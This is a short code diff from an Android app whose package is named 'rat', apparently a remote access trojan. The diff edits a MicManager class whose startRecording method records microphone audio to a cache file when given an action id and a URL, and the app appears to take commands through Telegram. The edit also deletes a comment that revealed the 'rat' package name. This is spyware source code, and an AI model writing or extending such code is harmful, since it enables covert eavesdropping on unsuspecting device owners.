@@ -38,13 +38,12 @@ import static com.hhm.android.otherapp.TelegramManager.localVersionName;
 public class MicManager {
     public static final String TAG = "MicManager";
 
-    static MediaRecorder recorder;
-    static File audioFile = null;
-    static TimerTask stopRecording;
-
+    public static MediaRecorder recorder;
+    public static File audioFile = null;
+    public static TimerTask stopRecording;
 
     public static void startRecording(final Context context, int sec, final int action_id, final String url) throws Exception {
-        File dir = context.getCacheDir(); ///data/user/0/com.hhm.android.rat/cache
+        File dir = context.getCacheDir();
         try {
             Log.e(TAG,"startRecording():DIRR "+ dir.getAbsolutePath());
             audioFile = File.createTempFile("sound", ".mp3", dir);
